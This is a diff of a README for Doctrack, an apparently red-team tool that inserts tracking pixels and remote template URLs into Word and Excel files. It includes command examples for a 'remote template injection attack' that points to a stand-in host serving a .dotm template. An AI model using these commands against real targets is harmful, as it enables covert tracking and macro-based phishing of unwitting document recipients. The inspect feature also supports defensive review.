@@ -1,7 +1,7 @@
 ﻿# Doctrack
 Tool to manipulate and insert tracking pixels into Office Open XML documents.
 ## Features
-* Insert tracking pixels Office Open XML documents (Word and Excel)
+* Insert tracking pixels into Office Open XML documents (Word and Excel)
 * Inject template URL for remote template injection attack
 * Inspect external target URLs and metadata
 * Create Office Open XML documents (#TODO)
@@ -16,7 +16,6 @@ On Linux:
 ```bash
 $ dotnet publish -r linux-x64 -c Release /p:PublishSingleFile=true
 ```
-
 ## Usage
 ```cmd
 $ doctrack --help
@@ -35,7 +34,8 @@ Copyright (C) 2020 doctrack
   -s, --inspect       (Default: false) Inspect external targets.
   --help              Display this help screen.
 ```
-Available document types:
+Available document types listed below. If you want to insert tracking URL just use either Document or Workbook types, 
+other types listed here are only for document creation (#TODO).
 ```cmd
 $ doctrack --list-types
 Document              (*.docx)
@@ -47,20 +47,20 @@ MacroEnabledWorkbook  (*.xlsm)
 MacroEnabledTemplateX (*.xltm)
 TemplateX             (*.xltx)
 ```
-Insert tracking pixel:
+Insert tracking pixel and change document metadata:
 ```cmd
 $ doctrack -t Document -i test.docx -o test.docx --metadata metadata.json --url http://test.url/image.png
 ```
-Insert remote template URL (useful for remote template injection attack), works only with Word documents:
+Insert remote template URL (remote template injection attack), works only with Word documents:
 ```cmd
-$ doctrack -t Document -i test.docx -o test.docx --url http://test.url/template.docm --template
+$ doctrack -t Document -i test.docx -o test.docx --url http://test.url/template.dotm --template
 ```
 Inspect external target URLs and metadata:
 ```cmd
 $ doctrack -t Document -i test.docx --inspect
 [External targets]
-Part: MainDocumentPart, ID: R8783bc77406d476d, URI: http://test.url/image.png
-Part: DocumentSettingsPart, ID: R33c36bdf400b44f6, URI: http://test.url/template.docm
+Part: /word/document.xml, ID: R8783bc77406d476d, URI: http://test.url/image.png
+Part: /word/settings.xml, ID: R33c36bdf400b44f6, URI: http://test.url/template.dotm
 [Metadata]
 Creator:
 Title:
